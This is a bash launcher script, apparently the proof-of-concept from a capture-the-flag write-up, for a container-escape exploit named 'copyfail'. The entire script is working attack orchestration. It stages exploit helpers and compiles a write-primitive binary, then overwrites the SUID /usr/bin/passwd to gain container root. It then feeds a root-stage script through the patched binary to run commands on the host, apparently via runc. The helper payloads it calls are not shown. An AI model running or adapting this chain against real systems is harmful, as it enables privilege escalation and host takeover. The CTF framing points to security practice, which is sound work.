#!/usr/bin/env bash
set -euo pipefail

# Copy this whole writeup directory to the CTF container and run:
#   ./poc.sh [host-command [args...]]

SRC_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
if [[ "${DCF_PY+x}" == "x" ]]; then
    DCF_PY_USER_SET=1
else
    DCF_PY_USER_SET=0
fi
DCF_WORK="${DCF_WORK:-/tmp/copyfail-poc-$(id -u)}"
DCF_PYROOT="${DCF_PYROOT:-$DCF_WORK/pyroot}"
DCF_PY="${DCF_PY:-}"
DCF_PY_TARBALL="${DCF_PY_TARBALL:-$SRC_DIR/python-standalone.tar.gz}"
DCF_COPYFAIL_HELPER="${DCF_COPYFAIL_HELPER:-$DCF_WORK/copyfail_write}"
DCF_SUIDBIN="${DCF_SUIDBIN:-/usr/bin/passwd}"
DCF_HEALTHBIN="${DCF_HEALTHBIN:-/bin/sh}"
DCF_INTERVAL="${DCF_INTERVAL:-10}"
DCF_FAKE_LOADER_SLEEP="${DCF_FAKE_LOADER_SLEEP:-1}"
DCF_FAKE_LOADER_PATH="${DCF_FAKE_LOADER_PATH:-}"
DCF_PAYLOAD_ARCH="${DCF_PAYLOAD_ARCH:-}"
DCF_HOST_CMD_TIMEOUT="${DCF_HOST_CMD_TIMEOUT:-240}"
DCF_USE_PYROOT=0
export DCF_WORK DCF_PYROOT DCF_PY_TARBALL DCF_COPYFAIL_HELPER DCF_SUIDBIN
export DCF_HEALTHBIN DCF_INTERVAL DCF_FAKE_LOADER_SLEEP DCF_FAKE_LOADER_PATH DCF_PAYLOAD_ARCH DCF_HOST_CMD_TIMEOUT
export PYTHONDONTWRITEBYTECODE=1

HELPERS=(
    cf_passwd_bash.py
    copyfail_primitive.py
    elf_payloads.py
    cf_write.py
    cf_patch_fd_host.py
    exploit_runc.py
    install_fake_loader.py
    root_stage.sh
)

log() {
    printf '[+] %s\n' "$*"
}

die() {
    printf '[-] %s\n' "$*" >&2
    exit 1
}

python_works() {
    local py="$1"
    [[ -n "$py" && -x "$py" ]] || return 1
    "$py" - <<'PY' >/dev/null 2>&1
import os
import sys

sys.exit(0 if hasattr(os, "setuid") else 1)
PY
}

system_python() {
    command -v python3 || true
}

prefer_system_python() {
    local machine
    machine="$(uname -m)"
    [[ "$machine" == "aarch64" || "$machine" == "arm64" || "$DCF_PAYLOAD_ARCH" == "aarch64" || "$DCF_PAYLOAD_ARCH" == "arm64" ]]
}

configure_python_env() {
    export DCF_PY DCF_USE_PYROOT
    if [[ "$DCF_USE_PYROOT" == "1" ]]; then
        export PYTHONHOME="$DCF_PYROOT"
        export LD_LIBRARY_PATH="$DCF_PYROOT/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
    else
        unset PYTHONHOME
    fi
}

stage_copyfail_helper() {
    local src_bin="$SRC_DIR/copyfail_write"
    local src_c="$SRC_DIR/copyfail_write.c"
    local dst="$DCF_WORK/copyfail_write"
    local machine
    machine="$(uname -m)"

    if [[ -f "$src_c" && (! -f "$src_bin" || "$machine" == "aarch64" || "$machine" == "arm64" || "$DCF_PAYLOAD_ARCH" == "aarch64" || "$DCF_PAYLOAD_ARCH" == "arm64") ]]; then
        local cc
        cc="${CC:-}"
        if [[ -z "$cc" ]]; then
            cc="$(command -v gcc || command -v cc || true)"
        fi
        [[ -n "$cc" ]] || die "missing copyfail_write binary and no C compiler found to build $src_c"

        log "building native copyfail_write helper with $cc"
        "$cc" -O2 -Wall -Wextra "$src_c" -o "$dst"
    elif [[ -f "$src_bin" ]]; then
        cp "$src_bin" "$dst"
    else
        die "missing helper file: copyfail_write or copyfail_write.c"
    fi

    chmod 700 "$dst"
}

bootstrap_pyroot() {
    local pyroot_python="$DCF_PYROOT/bin/python3"
    local sys_py
    sys_py="$(system_python)"

    if [[ "$DCF_PY_USER_SET" == "1" ]]; then
        python_works "$DCF_PY" || die "configured DCF_PY is not executable on this architecture: $DCF_PY"
        DCF_USE_PYROOT=0
        configure_python_env
        log "using configured Python: $DCF_PY"
        return
    fi

    if prefer_system_python && python_works "$sys_py"; then
        DCF_PY="$sys_py"
        DCF_USE_PYROOT=0
        configure_python_env
        log "using native system Python: $DCF_PY"
        return
    fi

    DCF_PY="$pyroot_python"
    if python_works "$DCF_PY"; then
        DCF_USE_PYROOT=1
        configure_python_env
        return
    fi

    log "bootstrapping standalone Python in $DCF_PYROOT"
    [[ -f "$DCF_PY_TARBALL" ]] || die "missing vendored Python tarball: $DCF_PY_TARBALL"
    mkdir -p "$DCF_WORK" "$DCF_PYROOT"

    local extract_dir
    extract_dir="$DCF_WORK/python-standalone.extract"

    log "unpacking $DCF_PY_TARBALL"

    rm -rf "$DCF_PYROOT" "$extract_dir"
    mkdir -p "$DCF_PYROOT" "$extract_dir"
    tar -xzf "$DCF_PY_TARBALL" -C "$extract_dir"
    [[ -x "$extract_dir/python/bin/python3" ]] || die "unexpected Python tarball layout"
    mv "$extract_dir/python"/* "$DCF_PYROOT"/
    rm -rf "$extract_dir"

    if python_works "$DCF_PY"; then
        DCF_USE_PYROOT=1
        configure_python_env
        return
    fi

    if python_works "$sys_py"; then
        DCF_PY="$sys_py"
        DCF_USE_PYROOT=0
        configure_python_env
        log "vendored Python is not native; using system Python: $DCF_PY"
        return
    fi

    die "vendored Python cannot run on this architecture; install python3 or set DCF_PY to a native interpreter"
}

stage_files() {
    mkdir -p "$DCF_WORK"

    for helper in "${HELPERS[@]}"; do
        [[ -f "$SRC_DIR/$helper" ]] || die "missing helper file: $helper"
        cp "$SRC_DIR/$helper" "$DCF_WORK/$helper"
    done

    stage_copyfail_helper
    chmod 700 "$DCF_WORK"/*.py "$DCF_WORK/root_stage.sh"
}

run_root_stage() {
    if [[ "$(id -u)" == "0" ]]; then
        log "already root; running root stage directly"
        DCF_WORK="$DCF_WORK" DCF_PYROOT="$DCF_PYROOT" DCF_PY="$DCF_PY" DCF_USE_PYROOT="$DCF_USE_PYROOT" /bin/bash "$DCF_WORK/root_stage.sh" "$@"
        return
    fi

    log "patching $DCF_SUIDBIN to get container root"
    "$DCF_PY" "$DCF_WORK/cf_passwd_bash.py" "$DCF_SUIDBIN"

    log "launching root stage through patched $DCF_SUIDBIN"
    {
        printf 'DCF_WORK=%q\n' "$DCF_WORK"
        printf 'DCF_PYROOT=%q\n' "$DCF_PYROOT"
        printf 'DCF_PY=%q\n' "$DCF_PY"
        printf 'DCF_USE_PYROOT=%q\n' "$DCF_USE_PYROOT"
        printf 'DCF_COPYFAIL_HELPER=%q\n' "$DCF_COPYFAIL_HELPER"
        printf 'DCF_SUIDBIN=%q\n' "$DCF_SUIDBIN"
        printf 'DCF_HEALTHBIN=%q\n' "$DCF_HEALTHBIN"
        printf 'DCF_INTERVAL=%q\n' "$DCF_INTERVAL"
        printf 'DCF_FAKE_LOADER_SLEEP=%q\n' "$DCF_FAKE_LOADER_SLEEP"
        printf 'DCF_FAKE_LOADER_PATH=%q\n' "$DCF_FAKE_LOADER_PATH"
        printf 'DCF_PAYLOAD_ARCH=%q\n' "$DCF_PAYLOAD_ARCH"
        printf 'DCF_HOST_CMD_TIMEOUT=%q\n' "$DCF_HOST_CMD_TIMEOUT"
        printf 'set --'
        printf ' %q' "$@"
        printf '\n'
        cat "$DCF_WORK/root_stage.sh"
    } | "$DCF_SUIDBIN"
}

main() {
    bootstrap_pyroot
    stage_files
    run_root_stage "$@"
}

main "$@"
